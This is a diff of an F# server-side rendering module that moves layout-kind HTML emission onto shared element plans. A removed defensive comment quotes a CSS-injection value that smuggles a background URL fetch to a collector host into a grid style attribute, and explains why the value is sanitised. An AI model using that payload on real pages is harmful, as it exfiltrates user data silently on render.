@@ -123,14 +123,21 @@ module private Emit =
     let attrs (pairs: (string * string) list) : IReactProperty list =
         pairs |> List.map (fun (k, v) -> prop.custom (k, v))
 
-    let private property (p: ElementPlan.Prop) : IReactProperty =
+    /// A planned property; a behaviour attachment point writes nothing — the
+    /// served affordance is inert (Phase 2278).
+    let private property (p: ElementPlan.Prop) : IReactProperty list =
         match p with
-        | ElementPlan.Prop.Attr(name, value) -> prop.custom (name, value)
+        | ElementPlan.Prop.Attr(name, value) -> [ prop.custom (name, value) ]
         | ElementPlan.Prop.Style declarations ->
-            prop.style (declarations |> List.map (fun (k, v) -> style.custom (k, v)))
+            [ prop.style (declarations |> List.map (fun (k, v) -> style.custom (k, v))) ]
+        // The element library's own boolean spelling (`disabled="true"`) where
+        // it has one; a bare empty value otherwise — the pre-plan bytes.
+        | ElementPlan.Prop.Flag "disabled" -> [ prop.disabled true ]
+        | ElementPlan.Prop.Flag name -> [ prop.custom (name, "") ]
+        | ElementPlan.Prop.Behaviour _ -> []
 
     /// Planned properties (a style site's inline declarations, typically).
-    let props (ps: ElementPlan.Prop list) : IReactProperty list = ps |> List.map property
+    let props (ps: ElementPlan.Prop list) : IReactProperty list = ps |> List.collect property
 
     /// Emit a plan.
     let rec plan (p: ElementPlan.Plan<ReactElement>) : ReactElement =
@@ -140,7 +147,7 @@ module private Emit =
         | ElementPlan.Plan.TextNode text -> Html.text text
         | ElementPlan.Plan.Element spec ->
             let props =
-                [ yield! spec.Props |> List.map property
+                [ yield! spec.Props |> List.collect property
                   match spec.Content with
                   | ElementPlan.Content.Empty -> ()
                   | ElementPlan.Content.Text text -> prop.text text
@@ -269,445 +276,23 @@ and private renderKind
     (semanticAttrs: (string * string) list)
     : ReactElement =
     match kind with
-    // -- Layout --
-    // Phase 390 — the unified container; role + layout drive the emitted
-    // element + classes so SSR output stays byte-identical to the pre-merge
-    // per-kind emission (and to the client renderer — SSR parity corpus).
-    | NodeKind.Box spec ->
-        // Phase 1473 — the same print-break suffix the client renderer appends,
-        // from the same shared helper, so SSR and CSR emit an identical class
-        // string. This is the whole of the SSR floor: the declarations are CSS
-        // in a `@media print` block and need no script, so the static rendering
-        // honours them completely rather than degrading.
-        let brk = Theme.printBreakClasses spec.KeepTogether spec.BreakBefore
-
-        match spec.Role, spec.Layout with
-        | BoxRole.Card, _ ->
-            Html.section
-                [ prop.className (Css.Class.LayoutCard + brk)
-                  prop.children
-                      [ match spec.Heading with
-                        | Some heading ->
-                            Html.header [ prop.className Css.Class.CardHeading; prop.text (renderText ctx heading) ]
-                        | None -> Html.none
-                        Html.div
-                            [ prop.className Css.Class.CardBody
-                              prop.children (spec.Children |> List.map (renderNode (Walk.deeper walk) ctx)) ] ] ]
-        | BoxRole.Dashboard, _
-        | BoxRole.Group, BoxLayout.Auto ->
-            Html.div
-                [ prop.className (Css.Class.LayoutDashboard + brk)
-                  prop.children (spec.Children |> List.map (renderNode (Walk.deeper walk) ctx)) ]
-        | BoxRole.Separator, _ -> Html.hr [ prop.className (Css.Class.LayoutSeparator + brk) ]
-        | BoxRole.Group, BoxLayout.Grid(cols, gridTemplateColumns, gridGap) ->
-            // Phase 1523 — `templateColumns` is a free string on the wire that
-            // lands verbatim in a `style` attribute, so it is the one slot in
-            // this renderer where a decoded document writes CSS. Unsanitised,
-            // `"1fr;background:url(https://collector/?d=…)"` closed the
-            // declaration, opened a second one, and fetched on RENDER with no
-            // user act — outside the egress policy that governs every `href`
-            // and `src` in the same document — while the React client dropped
-            // the identical value silently. `sanitizeCssValueForSlot` is the
-            // shared grammar (`Fuaran.UI.EmissionGrammar`), so every host now
-            // emits the same bytes for the same tree; a refusal emits the empty
-            // value (the browser falls back to the stylesheet's own rule) and
-            // marks the element so the refusal is visible in the document.
-            let declaredTemplateColumns =
-                match gridTemplateColumns with
-                | Some custom -> custom
-                | None -> sprintf "repeat(%d, 1fr)" cols
-
-            let templateColumns, cssRefusalAttrs =
-                Sanitize.sanitizeCssValueForSlot "grid-template-columns" declaredTemplateColumns
-
-            // `gap` (Phase 459) emits only when set — gap-free grids stay
-            // byte-identical to the pre-459 emission (SSR parity with the client).
-            // The property name deliberately diverges from the client arm's
-            // camelCase `gridTemplateColumns`: Feliz.ViewEngine emits the key
-            // verbatim into the style attribute (where CSS ignores camelCase),
-            // while the client's React style object requires camelCase.
-            let gridDeclarations = Csp.Declarations.grid templateColumns gridGap
-
-            // Phase 1545 — under `Csp.Strict` these become a generated class and
-            // a collected declaration; under `Permissive` the `style` attribute
-            // above, byte for byte.
-            let gridClass, gridStyleProps =
-                ElementPlan.styleSite ctx.Policy.Csp (Some ctx.Styles) parentNodeId "grid" gridDeclarations
-
-            Html.div (
-                [ prop.className (Css.Class.LayoutGrid + brk + gridClass) ]
-                @ Emit.props gridStyleProps
-                @ [ prop.children (spec.Children |> List.map (renderNode (Walk.deeper walk) ctx)) ]
-                @ (cssRefusalAttrs |> List.map (fun (k, v) -> prop.custom (k, v)))
-            )
-        | BoxRole.Group, BoxLayout.Masonry(cols, masonryGap) ->
-            // Phase 1082 — column-FILL, realised through the CSS MULTI-COLUMN
-            // property family (`column-count` + the `gap` shorthand's
-            // `column-gap` half), which is what WIRE_FORMAT §3.6.7 makes
-            // normative. `grid-template-rows: masonry` is the other candidate
-            // and is deliberately not used: it is not deterministically
-            // available across engines, and a layout mode whose behaviour
-            // depends on which browser reads it is not a wire contract.
-            //
-            // The column count rides inline for the same reason `Grid`'s does —
-            // so a CSS host need not pre-declare every N — and the same
-            // narrow-viewport rules in the reference sheet collapse it.
-            let masonryDeclarations = Csp.Declarations.masonry cols masonryGap
-
-            let masonryClass, masonryStyleProps =
-                ElementPlan.styleSite ctx.Policy.Csp (Some ctx.Styles) parentNodeId "masonry" masonryDeclarations
-
-            Html.div (
-                [ prop.className (Css.Class.LayoutMasonry + brk + masonryClass) ]
-                @ Emit.props masonryStyleProps
-                @ [ prop.children (spec.Children |> List.map (renderNode (Walk.deeper walk) ctx)) ]
-            )
-        | BoxRole.Group, BoxLayout.Flex(direction, flexWrap, flexGap) ->
-            let dir = Css.stackDirection direction
-            let wrap = Css.stackWrap flexWrap
-
-            let flexClass, flexStyleProps =
-                ElementPlan.styleSite
-                    ctx.Policy.Csp
-                    (Some ctx.Styles)
-                    parentNodeId
-                    "flex"
-                    (Csp.Declarations.flex flexGap)
-
-            Html.div (
-                [ prop.className (Css.layoutStack dir wrap + brk + flexClass) ]
-                @ Emit.props flexStyleProps
-                @ [ prop.children (spec.Children |> List.map (renderNode (Walk.deeper walk) ctx)) ]
-            )
-    | NodeKind.SplitPanel spec ->
-        let weightLeft = max 0.0 (min 1.0 spec.Weight)
-        let weightRight = 1.0 - weightLeft
-        let renderedChildren = spec.Children |> List.map (renderNode (Walk.deeper walk) ctx)
-
-        let leftChildren, rightChildren =
-            match renderedChildren with
-            | [] -> [], []
-            | [ a ] -> [ a ], []
-            | a :: rest -> [ a ], rest
-
-        // Phase 1545 — the two panes are one node, so the slot discriminator is
-        // what keeps their generated classes apart when the weights are equal.
-        let leftClass, leftStyleProps =
-            ElementPlan.styleSite
-                ctx.Policy.Csp
-                (Some ctx.Styles)
-                parentNodeId
-                "split-left"
-                (Csp.Declarations.splitPane weightLeft)
-
-        let rightClass, rightStyleProps =
-            ElementPlan.styleSite
-                ctx.Policy.Csp
-                (Some ctx.Styles)
-                parentNodeId
-                "split-right"
-                (Csp.Declarations.splitPane weightRight)
-
-        Html.div
-            [ prop.className Css.Class.LayoutSplitPanel
-              prop.children
-                  [ Html.div (
-                        [ prop.className (Css.Class.SplitPaneLeft + leftClass) ]
-                        @ Emit.props leftStyleProps
-                        @ [ prop.children leftChildren ]
-                    )
-                    Html.div (
-                        [ prop.className (Css.Class.SplitPaneRight + rightClass) ]
-                        @ Emit.props rightStyleProps
-                        @ [ prop.children rightChildren ]
-                    ) ] ]
+    // Phase 2278 — the layout kinds are `ElementPlan.LayoutPlan` values,
+    // emitted inert (the server binds no attachment point).
+    | NodeKind.Box spec -> Emit.plan (ElementPlan.LayoutPlan.box (planContext walk ctx parentNodeId) spec)
+    | NodeKind.SplitPanel spec -> Emit.plan (ElementPlan.LayoutPlan.splitPanel (planContext walk ctx parentNodeId) spec)
     | NodeKind.Tabs spec ->
-        // Static tablist + the active panel. Keyboard nav + click dispatch are
-        // client-only (hydration); the server emits the ARIA structure inert.
-        let parentNodeIdStr = parentNodeId
-
-        let tabsLabelFromChild (child: Node<obj>) : string =
-            match child.Kind with
-            | NodeKind.Box { Role = BoxRole.Card
-                             Heading = Some h } -> renderText ctx h
-            | _ -> child.Id
-
-        let perTab
-            : {| label: string
-                 icon: string option
-                 disabled: bool |} list =
-            match spec.TabHeaders with
-            | Some headers ->
-                headers
-                |> List.map (fun h ->
-                    let disabled =
-                        h.Disabled
-                        |> Option.bind (BindingResolver.tryResolve ctx.Sources)
-                        |> Option.defaultValue false
-
-                    // `TabHeader.Icon` is a bare `string option` since the swap.
-                    let icon = h.Icon
-
-                    {| label = renderText ctx h.Label
-                       icon = icon
-                       disabled = disabled |})
-            | None ->
-                spec.Children
-                |> List.map (fun child ->
-                    {| label = tabsLabelFromChild child
-                       icon = None
-                       disabled = false |})
-
-        let orientationClass = Css.tabsOrientation spec.Orientation
-
-        let isVertical = spec.Orientation = Orientation.Vertical
-
-        let resolvedFromTag: int option =
-            match spec.TabTags, spec.ActiveTag with
-            | Some tags, Some tagBinding ->
-                BindingResolver.tryResolve ctx.Sources tagBinding
-                |> Option.bind (fun tag -> tags |> List.tryFindIndex ((=) tag))
-            | _ -> None
-
-        let activeIndex =
-            resolvedFromTag
-            |> Option.orElseWith (fun () -> BindingResolver.tryResolve ctx.Sources spec.ActiveIndex)
-            |> Option.defaultValue 0
-            |> max 0
-            |> min (max 0 (spec.Children.Length - 1))
-
-        let activeChild =
-            spec.Children
-            |> List.tryItem activeIndex
-            |> Option.orElseWith (fun () -> spec.Children |> List.tryHead)
-
-        let tabId (i: int) = Ids.tab parentNodeIdStr i
-        let panelId (i: int) = Ids.panel parentNodeIdStr i
-
-        Html.div
-            [ prop.className (Css.layoutTabs orientationClass)
-              prop.children
-                  [ Html.div
-                        [ prop.className Css.Class.TabsBar
-                          prop.role "tablist"
-                          prop.custom ("aria-orientation", (if isVertical then "vertical" else "horizontal"))
-                          prop.children
-                              [ for (i, t) in List.indexed perTab ->
-                                    let isActive = i = activeIndex
-
-                                    let cls =
-                                        String.concat
-                                            " "
-                                            [ Css.Class.Tab
-                                              if isActive then
-                                                  Css.Class.TabActive
-                                              if t.disabled then
-                                                  Css.Class.TabDisabled ]
-
-                                    Html.button (
-                                        [ prop.id (tabId i)
-                                          prop.className cls
-                                          prop.role "tab"
-                                          prop.custom ("aria-selected", (if isActive then "true" else "false"))
-                                          prop.custom ("aria-controls", panelId i)
-                                          prop.tabIndex (if isActive then 0 else -1)
-                                          prop.custom ("data-tab-index", string i) ]
-                                        @ (if t.disabled then
-                                               [ prop.custom ("aria-disabled", "true"); prop.disabled true ]
-                                           else
-                                               [])
-                                        @ [ prop.children
-                                                [ match t.icon with
-                                                  | Some iconSrc ->
-                                                      Emit.plan (
-                                                          ElementPlan.DisplayPlan.iconHook Css.Class.TabIcon iconSrc
-                                                      )
-                                                  | None -> Html.none
-                                                  Html.span [ prop.className Css.Class.TabLabel; prop.text t.label ] ] ]
-                                    ) ] ]
-                    Html.div
-                        [ prop.className Css.Class.TabsPanels
-                          prop.children (
-                              match activeChild with
-                              | Some childNode ->
-                                  [ Html.div
-                                        [ prop.id (panelId activeIndex)
-                                          prop.role "tabpanel"
-                                          prop.custom ("aria-labelledby", tabId activeIndex)
-                                          prop.tabIndex 0
-                                          prop.className Css.Class.TabsPanel
-                                          prop.children [ renderNode (Walk.deeper walk) ctx childNode ] ] ]
-                              | None -> []
-                          ) ] ] ]
+        Emit.plan (
+            ElementPlan.LayoutPlan.tabs
+                (planContext walk ctx parentNodeId)
+                spec
+                (ElementPlan.TabsModel.ofSpec ctx.Sources spec)
+        )
     | NodeKind.SummaryList spec ->
-        Html.section
-            [ prop.className Css.Class.LayoutSummaryList
-              prop.children
-                  [ match spec.Heading with
-                    | Some heading ->
-                        Html.header
-                            [ prop.className Css.Class.SummaryListHeading
-                              prop.text (renderText ctx heading) ]
-                    | None -> Html.none
-                    Html.div
-                        [ prop.className Css.Class.SummaryListBody
-                          prop.children (spec.Children |> List.map (renderNode (Walk.deeper walk) ctx)) ] ] ]
-    | NodeKind.Disclosure spec ->
-        let resolvedOpen =
-            BindingResolver.tryResolve ctx.Sources spec.Open
-            |> Option.defaultValue spec.DefaultOpen
-
-        Html.details (
-            [ prop.className Css.Class.LayoutDisclosure ]
-            @ (if resolvedOpen then [ prop.custom ("open", "") ] else [])
-            @ [ prop.children
-                    [ Html.summary
-                          [ prop.className Css.Class.DisclosureSummary
-                            prop.text (renderText ctx spec.Heading) ]
-                      Html.div
-                          [ prop.className Css.Class.DisclosureBody
-                            prop.children (spec.Children |> List.map (renderNode (Walk.deeper walk) ctx)) ] ] ]
-        )
-    | NodeKind.Stepper spec ->
-        let activeIndex =
-            BindingResolver.tryResolve ctx.Sources spec.ActiveStep |> Option.defaultValue 0
-
-        Html.div
-            [ prop.className Css.Class.LayoutStepper
-              prop.children
-                  [ Html.ol
-                        [ prop.className Css.Class.StepperNumbers
-                          prop.children
-                              [ for i in 0 .. spec.Children.Length - 1 ->
-                                    let isActive = i = activeIndex
-
-                                    Html.li
-                                        [ prop.className (
-                                              if isActive then
-                                                  Css.Class.StepperStepActive
-                                              else
-                                                  Css.Class.StepperStep
-                                          )
-                                          // Server-driven step selection: the live
-                                          // shim bridges a step-header click to
-                                          // `payload.index` off this attribute
-                                          // (mirrors the tab bar's data-tab-index).
-                                          prop.custom ("data-step-index", string i)
-                                          prop.text (sprintf "%d" (i + 1)) ] ] ]
-                    Html.div
-                        [ prop.className Css.Class.StepperBody
-                          prop.children (
-                              match List.tryItem activeIndex spec.Children with
-                              | Some node -> [ renderNode (Walk.deeper walk) ctx node ]
-                              | None -> []
-                          ) ] ] ]
-    | NodeKind.Modal spec ->
-        // Phase 289 overlay render-fidelity contract (server half): the overlay
-        // is ALWAYS emitted (no portal), positioned + z-indexed by CSS; closed =
-        // the `hidden` attribute. Structure is byte-identical to the client
-        // renderer (same classes + `role="dialog"` + `aria-modal`) so React
-        // hydration finds the DOM it expects. Dismiss handlers are client-only
-        // (attached on hydration) — not a structural difference.
-        let isOpen =
-            BindingResolver.tryResolve ctx.Sources spec.Open |> Option.defaultValue false
-
-        // Phase 1119 — the SSR floor for a `Popover`, and the honest one. A
-        // no-script host cannot measure an anchor, so it cannot place a surface
-        // against one: what it emits is the popover IN FLOW, at the position the
-        // node occupies in the document, with no scrim and no `aria-modal`. An
-        // emitter that wants the static render to read correctly puts the
-        // popover node immediately after its anchor — which is the normative
-        // statement in `WIRE_FORMAT.md` §3.6.11, not a property of this file.
-        //
-        // The markup is byte-identical to the client renderer's, so hydration
-        // finds the DOM it expects; the client adds placement and the
-        // light-dismiss listeners imperatively after mount.
-        // Every emitted class name is a LITERAL at its call site, never composed
-        // from a family prefix — the class-vocabulary coverage guard reads the
-        // source for those literals, and a composed name is invisible to it.
-        let surfaceChildren (headingClass: string) (dismissClass: string) (bodyClass: string) =
-            let headingEls =
-                match spec.Heading with
-                | Some h -> [ Html.h2 [ prop.className headingClass; prop.text (renderText ctx h) ] ]
-                | None -> []
-
-            let dismissEls =
-                if spec.Dismissable then
-                    [ Html.button
-                          [ prop.className dismissClass
-                            prop.custom ("type", "button")
-                            prop.ariaLabel "Close"
-                            prop.text "×" ] ]
-                else
-                    []
-
-            headingEls
-            @ dismissEls
-            @ [ Html.div
-                    [ prop.className bodyClass
-                      prop.children (spec.Children |> List.map (renderNode (Walk.deeper walk) ctx)) ] ]
-
-        if spec.Modality = ModalityKind.Popover then
-            Html.div (
-                [ prop.className Css.Class.Popover ]
-                @ (if not isOpen then [ prop.custom ("hidden", "") ] else [])
-                // The anchor declaration RIDES the static render — it records
-                // that the id was read, and it is the hook the client control
-                // resolves on mount. It is explicitly not coverage: nothing in
-                // a no-script host acts on it.
-                @ (match spec.Anchor with
-                   | Some a -> [ prop.custom ("data-fuaran-popover-anchor", a) ]
-                   | None -> [])
-                @ [ prop.children
-                        [ Html.div
-                              [ prop.className Css.Class.PopoverSurface
-                                prop.role "dialog"
-                                prop.children (
-                                    surfaceChildren
-                                        Css.Class.PopoverHeading
-                                        Css.Class.PopoverDismiss
-                                        Css.Class.PopoverBody
-                                ) ] ] ]
-            )
-        else
-            Html.div (
-                [ prop.className Css.Class.ModalOverlay ]
-                @ (if not isOpen then [ prop.custom ("hidden", "") ] else [])
-                @ [ prop.children
-                        [ Html.div
-                              [ prop.className Css.Class.ModalDialog
-                                prop.role "dialog"
-                                prop.custom ("aria-modal", "true")
-                                prop.children (
-                                    surfaceChildren Css.Class.ModalHeading Css.Class.ModalDismiss Css.Class.ModalBody
-                                ) ] ] ]
-            )
-    | NodeKind.ScrollArea spec ->
-        let axisClass = Css.scrollArea spec.Orientation
-
-        // Phase 1545 — the canonical pairs, spelled as `style.maxHeight
-        // (length.px h)` emitted them (`max-height:<n>px`), so the `Permissive`
-        // bytes are unchanged and the TS twin's `max-height:${n}px` still
-        // matches.
-        let scrollDeclarations = Csp.Declarations.scrollArea spec.MaxHeight spec.MaxWidth
-
-        let scrollClass, scrollStyleProps =
-            ElementPlan.styleSite ctx.Policy.Csp (Some ctx.Styles) parentNodeId "scroll" scrollDeclarations
-
-        Html.div (
-            // `prop.custom ("tabindex", ...)` emits the lowercase attribute the
-            // client's React `prop.tabIndex` normalises to — keeps SSR↔CSR
-            // byte-identical (Feliz.ViewEngine's `prop.tabIndex` would emit the
-            // camelCase `tabIndex`, diverging from React's DOM `tabindex`).
-            [ prop.className (axisClass + scrollClass); prop.custom ("tabindex", "0") ]
-            @ Emit.props scrollStyleProps
-            @ [ prop.children (spec.Children |> List.map (renderNode (Walk.deeper walk) ctx)) ]
-        )
-    // -- Display --
-    // Phase 2108 — the leaf display kinds are `DisplayPlan` values this tier
-    // emits; the client renderer emits the same plans. A value-bearing kind
-    // first asks the shared state-slot rule whether it renders its
-    // `OnLoading` / `OnError` node instead of its body.
+        Emit.plan (ElementPlan.LayoutPlan.summaryList (planContext walk ctx parentNodeId) spec)
+    | NodeKind.Disclosure spec -> Emit.plan (ElementPlan.LayoutPlan.disclosure (planContext walk ctx parentNodeId) spec)
+    | NodeKind.Stepper spec -> Emit.plan (ElementPlan.LayoutPlan.stepper (planContext walk ctx parentNodeId) spec)
+    | NodeKind.Modal spec -> Emit.plan (ElementPlan.LayoutPlan.modal (planContext walk ctx parentNodeId) spec)
+    | NodeKind.ScrollArea spec -> Emit.plan (ElementPlan.LayoutPlan.scrollArea (planContext walk ctx parentNodeId) spec)
     | NodeKind.Heading spec -> Emit.plan (ElementPlan.DisplayPlan.heading ctx.Sources spec)
     | NodeKind.Markdown spec -> Emit.plan (ElementPlan.DisplayPlan.markdown ctx.Policy.Egress ctx.Sources spec)
     | NodeKind.Metric spec ->
@@ -1782,6 +1367,19 @@ and private renderKind
                           prop.text (sprintf "[fuaran:mount '%s' — guest loader not attached]" spec.ScopeId) ] ] ]
 
 // ─── Custom escape hatch (Phase 141 — server registry seam) ─────────────────
+
+/// What a container kind's plan needs from this renderer (Phase 2278): the
+/// style collector, and a child rendered one walk level down.
+and private planContext
+    (walk: Walk)
+    (ctx: ServerRenderContext)
+    (nodeId: string)
+    : ElementPlan.PlanContext<obj, ReactElement> =
+    { Sources = ctx.Sources
+      Csp = ctx.Policy.Csp
+      Collector = Some ctx.Styles
+      NodeId = nodeId
+      Child = fun child -> ElementPlan.Plan.Host(renderNode (Walk.deeper walk) ctx child) }
 
 and private renderCustom
     (ctx: ServerRenderContext)
